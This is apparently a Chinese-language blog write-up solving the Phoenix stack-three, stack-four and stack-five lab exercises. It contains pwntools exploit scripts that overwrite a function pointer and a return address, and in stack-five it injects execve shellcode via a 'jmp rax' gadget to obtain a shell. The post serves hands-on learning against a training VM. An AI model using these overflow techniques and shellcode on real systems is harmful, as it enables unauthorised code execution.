---
title: "[pwn笔记2]stack-three, stack-four, stack-five(Phoenix)"
urlname: "[pwn笔记2]stack-three, stack-four, stack-five(Phoenix)"
date: March 21, 2023 2:29 PM
tags: [pwn, stack]
---
最近又是数模又是开学的，很难受，还是看看远方的~~水~~入门题吧。没有动态基址，还是比较简单的。

（写这段的时候还没想到接下来还有概率论考试，还打了场ctf校赛，所以。。。）

## **stack-three**

覆盖一个即将被调用的函数指针的数据，跟前面差不多。

```
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 0x40 + p64(0x40069d)
sh = shell.run(b"/opt/phoenix/amd64/stack-three")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))

```

## **stack-four**

覆盖栈上的返回地址。

![https://s2.loli.net/2023/02/25/YB5ux4CUSAeowPv.png](https://s2.loli.net/2023/02/25/YB5ux4CUSAeowPv.png)

`0x648-0x5f0=88`

```
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 88 + p64(0x40061d)
sh = shell.run(b"/opt/phoenix/amd64/stack-four")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))
```

## **stack-five**

需要拿到shell。由于栈是可执行的，可以利用gets来把shellcode读进来，覆盖返回地址来执行shellcode。

这个过程看起来非常完美，可是不知道为什么返回到栈上执行两步就会段错误。关掉了aslr，尝试了附加调试和取消gdb环境变量，以消除栈地址的变化，都没有进展。

后来看到了另一个方法：

![Untitled](/pics/%5Bpwn%E7%AC%94%E8%AE%B02%5Dstack-three,%20stack-four,%20stack-five(Phoeni%207b5b662947354bf68eff78239c6d2262/Untitled.png)

调用gets之前，s被放入了rax中。所以直接把shellcode放到最前面就会被rax指向。

我们可以用rop，找到一段`jmp rax`，返回到那里，然后下一步就会跳到shellcode了。

```
from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

total = 136
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
jmp_rax = p64(0x400481)
s = sc+b"a"*(total-len(sc))+jmp_rax

sh = shell.run(b"/opt/phoenix/amd64/stack-five")
sh.recvlines(1)
sh.sendline(s)
sh.interactive()
```

还有一件事，gef可以用以下命令调整context里stack显示的行数

```
gef config context.nb_lines_stack 30
```

这样就不用在虚拟机里再装个peda了（这两个共存很卡）。
